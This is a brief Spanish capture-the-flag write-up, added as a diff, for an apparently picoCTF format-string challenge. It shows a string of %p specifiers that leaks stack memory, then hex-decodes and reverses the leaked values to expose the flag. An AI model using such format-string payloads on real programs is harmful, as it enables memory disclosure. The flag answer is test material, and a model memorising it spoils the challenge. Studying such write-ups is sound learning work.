@@ -1,0 +1,18 @@
+El reto se basa en hace un ataque de format string, se basa en hacer un serie de %p, para que me 
+saque informacion cruda de la pila. Entonces al hacer una serie de esos %p tenemos el siguiente resultado
+
+Give me your order and I'll read it back to you:
+%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p
+Here's your order: 0x402118,(nil),0x718f04ce4a00,(nil),0x5e7880,0xa347834,0x7fffcf94df10,0x718f04ad5e60,0x718f04cfa4d0,0x1,0x7fffcf94dfe0,(nil),(nil),0x7b4654436f636970,0x355f31346d316e34,0x3478345f33317937,0x35365f673431665f,0x7d313464303935,0x7,0x718f04cfc8d8,0x2300000007,0x206e693374307250,0xa336c797453
+Bye!
+
+Lo pegamos en CyberChef y utilizamos la opcion de "from hex", y me da muchos caracteres no imprimibles
+y otros que parecen ser el formato de flag "picoCTF", limpiamos los caracteres que no necesitamos.
+
+Utilizamos la opcion "reverse" y acomodamos la info de la siguiente manera:
+
+0x7d313464303935,0x35365f673431665f,0x3478345f33317937,0x355f31346d316e34,0x7b4654436f636970
+
+El resultado es la flag:
+
+0x7d313464303935,0x35365f673431665f,0x3478345f33317937,0x355f31346d316e34,0x7b4654436f636970
